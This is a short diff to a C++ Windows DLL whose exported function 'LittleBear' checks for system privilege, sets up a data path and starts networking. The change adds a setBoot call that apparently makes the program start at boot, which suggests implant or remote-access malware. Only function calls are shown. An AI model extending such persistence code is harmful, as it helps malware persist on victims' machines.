@@ -52,7 +52,7 @@ using namespace std;
 extern "C" __declspec(dllexport) int __stdcall LittleBear()
 {
 #ifdef _DEBUG
-	test();
+
 #endif
 
 	BOOL bSystemPri = IsSystemPrivilege();
@@ -96,6 +96,10 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 		writeLog("createDataPath error\r\n");
 		return FALSE;
 	}
+
+	
+
+	iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
 
 	iRet = networkInit();
 
